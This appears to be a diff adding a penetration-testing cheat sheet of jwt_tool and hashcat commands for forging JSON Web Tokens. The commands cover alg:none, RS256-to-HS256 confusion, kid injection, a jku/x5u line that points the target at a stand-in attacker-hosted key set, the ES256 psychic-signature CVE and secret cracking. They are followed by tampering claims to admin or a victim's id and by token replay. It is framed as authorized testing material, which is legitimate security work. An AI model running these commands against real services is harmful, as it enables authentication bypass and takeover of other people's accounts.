@@ -1,0 +1,38 @@
+# ============================================================================
+# Safe PoC -> x8bitranjit
+# JWT tamper battery - jwt_tool command matrix (benign discipline included).
+# Authorized testing only. KIT CROSS-REF: JWT_CHECKLIST rows 003-016.
+# WHAT TO EDIT: $TOKEN -> your captured token; endpoints after forging.
+# ============================================================================
+
+# 0) full automated sweep (triage its high-severity flags first)
+python3 jwt_tool.py $TOKEN -M at
+
+# 1) alg:none family
+python3 jwt_tool.py $TOKEN -X a
+
+# 2) RS256 -> HS256 confusion (needs the public key: JWKS endpoint or cert)
+python3 jwt_tool.py $TOKEN -X k -pk public.pem
+
+# 3) kid injection (traversal to empty key / SQLi forms)
+python3 jwt_tool.py $TOKEN -X i
+
+# 4) jku/x5u -> attacker-hosted JWKS (serve your jwks.json)
+python3 jwt_tool.py $TOKEN -X s -ju https://attacker.example.invalid/jwks.json -pr my_private.pem
+
+# 5) ES256 psychic signature (CVE-2022-21449, Java stacks)
+python3 jwt_tool.py $TOKEN -X psychic
+
+# 6) weak HMAC secret crack (then re-sign with role=admin)
+python3 jwt_tool.py $TOKEN -C -d jwt.secrets.list
+hashcat -a 0 -m 16500 token.txt jwt.secrets.list
+
+# 7) manual claim tamper once ANY forge primitive lands (prove authorization
+#    CHANGE - an accepted 200 is not proof):
+#    role -> admin | sub -> victim_id | email_verified -> true | tenant/org swap
+
+# 8) lifecycle: replay after logout/password change; one-time reset token
+#    reuse; refresh rotation failure (Burp Repeater, no tool needed)
+
+# DISCIPLINE: forge on YOUR test account; keep every forged token + command
+# as the regression pack (JWT-034).
